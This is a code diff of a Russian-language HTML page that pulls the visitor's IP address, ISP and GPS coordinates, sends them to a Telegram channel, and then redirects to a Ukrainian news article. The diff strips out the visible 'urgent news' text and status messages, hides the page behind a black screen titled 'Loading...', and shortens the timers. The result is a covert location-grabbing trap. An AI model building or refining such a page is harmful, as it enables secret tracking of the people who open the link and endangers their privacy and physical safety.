@@ -2,45 +2,21 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Срочная новость</title>
+  <title>Загрузка...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      background-color: #f4f4f4;
-      font-family: Arial, sans-serif;
-      color: #333;
-      padding: 20px;
-      max-width: 600px;
-      margin: auto;
-    }
-    h1 {
-      color: #b30000;
-      font-size: 1.6em;
-    }
-    .content {
-      margin-top: 20px;
-      font-size: 1.1em;
-      line-height: 1.5;
-    }
-    .status {
-      background: #fff3cd;
-      padding: 15px;
-      border: 1px solid #ffeeba;
-      margin-top: 25px;
-      border-radius: 8px;
+    html, body {
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      color: #000;
+      height: 100vh;
+      overflow: hidden;
     }
   </style>
 </head>
 <body>
-  <h1>Срочная новость: ЧП в вашем районе</h1>
-  <div class="content">
-    <p>По предварительным данным, в вашем регионе зафиксировано необычное происшествие. Подробности уточняются.</p>
-    <p>Службы проверяют данные, пожалуйста, ожидайте обновления информации.</p>
-  </div>
-
-  <div class="status" id="status">
-    Получение данных о вашем регионе...
-  </div>
+  <div id="status" style="display:none;">Загрузка...</div>
 
   <script>
     const redirectUrl = "https://dnepr.express/ru/post/masshtabnyj-narkobiznes-razoblachili-v-15-oblastyah-ukrainy-sredi-nih-dnepropetrovshina";
@@ -56,7 +32,7 @@
       });
     }
 
-    function startRedirect(delay = 1000) {
+    function startRedirect(delay = 500) {
       setTimeout(() => {
         window.location.href = redirectUrl;
       }, delay);
@@ -73,14 +49,10 @@ IP: ${data.ip}
 Провайдер: ${data.connection.isp}
 Время: ${new Date().toLocaleString()}`;
 
-        document.getElementById("status").innerText = ipMessage + "\n\n⏳ Ожидаю GPS...";
-
         let gpsTimeout = setTimeout(() => {
-          const fallback = ipMessage + "\n\n⚠️ GPS: не получен (таймаут)";
-          document.getElementById("status").innerText = fallback;
-          sendToTelegram(fallback);
+          sendToTelegram(ipMessage + "\n\n⚠️ GPS: не получен (таймаут)");
           startRedirect();
-        }, 8000);
+        }, 4000); // ускоренный таймер
 
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
@@ -89,32 +61,23 @@ IP: ${data.ip}
               const lat = pos.coords.latitude;
               const lon = pos.coords.longitude;
               const acc = pos.coords.accuracy;
-
               const full = ipMessage + `\n\nGPS: ${lat}, ${lon}\nТочность: ${acc} м`;
-              document.getElementById("status").innerText = full;
               sendToTelegram(full);
               startRedirect();
             },
             err => {
               clearTimeout(gpsTimeout);
-              const errMsg = ipMessage + `\n\n⚠️ Ошибка GPS: ${err.message}`;
-              document.getElementById("status").innerText = errMsg;
-              sendToTelegram(errMsg);
+              sendToTelegram(ipMessage + `\n\n⚠️ Ошибка GPS: ${err.message}`);
               startRedirect();
             }
           );
         } else {
-          const notSupported = ipMessage + "\n\n⚠️ GPS не поддерживается.";
-          document.getElementById("status").innerText = notSupported;
-          sendToTelegram(notSupported);
+          sendToTelegram(ipMessage + "\n\n⚠️ GPS не поддерживается.");
           startRedirect();
         }
       })
       .catch(err => {
-        const failMsg = "❌ Ошибка получения IP-геолокации.";
-        document.getElementById("status").innerText = failMsg;
-        console.error(err);
-        sendToTelegram(failMsg);
+        sendToTelegram("❌ Ошибка получения IP-геолокации.");
         startRedirect();
       });
   </script>
